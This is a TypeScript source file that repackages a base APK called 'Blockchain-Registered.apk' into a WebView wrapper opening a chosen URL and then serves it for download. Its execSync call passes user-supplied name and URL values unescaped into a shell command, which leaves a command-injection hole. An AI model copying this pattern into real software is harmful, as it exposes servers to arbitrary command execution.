import { execSync } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';

interface APKWrapperOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
  packageName?: string;
}

/**
 * Generate a customized Android APK wrapper that opens a custom URL
 * Uses apktool to decompile, modify, and recompile
 * This approach creates a WebView wrapper for any URL
 */
export async function generateAPKWrapper(options: APKWrapperOptions): Promise<{
  success: boolean;
  apkPath?: string;
  downloadUrl?: string;
  filename?: string;
  error?: string;
}> {
  const timestamp = Date.now();
  const outputDir = '/tmp/apk-output';
  
  try {
    console.log(`[APK] Starting APK wrapper generation for: ${options.appName}`);
    console.log(`[APK] URL: ${options.appUrl}`);

    // Find base APK
    const possibleBasePaths = [
      '/app/public/apks/Blockchain-Registered.apk',
      '/home/ubuntu/remote-monitor/public/apks/Blockchain-Registered.apk',
      path.join(process.cwd(), 'public/apks/Blockchain-Registered.apk'),
    ];

    let baseAPK = '';
    for (const p of possibleBasePaths) {
      if (fs.existsSync(p)) {
        baseAPK = p;
        console.log(`[APK] Found base APK at: ${baseAPK}`);
        break;
      }
    }

    if (!baseAPK) {
      console.error('[APK] Base APK not found');
      return {
        success: false,
        error: 'Base APK not found',
      };
    }

    // Ensure output directory exists
    if (!fs.existsSync(outputDir)) {
      fs.mkdirSync(outputDir, { recursive: true });
    }

    // Run Python script to create wrapper APK
    console.log('[APK] Running wrapper APK creation script...');
    
    const pythonScript = path.join(__dirname, '..', '..', 'create_wrapper_apk.py');
    if (!fs.existsSync(pythonScript)) {
      console.error('[APK] Python script not found at:', pythonScript);
      return {
        success: false,
        error: 'APK creation script not found',
      };
    }

    try {
      const output = execSync(
        `python3 "${pythonScript}" "${options.appName}" "${options.appUrl}" "${baseAPK}" "${outputDir}"`,
        { encoding: 'utf-8', timeout: 300000, maxBuffer: 10 * 1024 * 1024 }
      );

      console.log('[APK] Script output:', output);

      // Parse result from script output
      const resultMatch = output.match(/\[RESULT\] ({.*})/);
      if (!resultMatch) {
        throw new Error('Failed to parse script result');
      }

      const result = JSON.parse(resultMatch[1]);

      if (!result.success) {
        throw new Error(result.error || 'Unknown error');
      }

      console.log(`[APK] ✓ APK wrapper created successfully`);
      console.log(`[APK] File: ${result.filename}`);
      console.log(`[APK] Size: ${result.size_mb.toFixed(2)}MB`);

      // Return download URL
      const downloadUrl = `/download/${result.filename}`;

      return {
        success: true,
        apkPath: result.apk_path,
        filename: result.filename,
        downloadUrl: downloadUrl,
      };
    } catch (error) {
      console.error('[APK] Script execution failed:', error);
      throw error;
    }
  } catch (error) {
    console.error('[APK] APK Generation Error:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error',
    };
  }
}
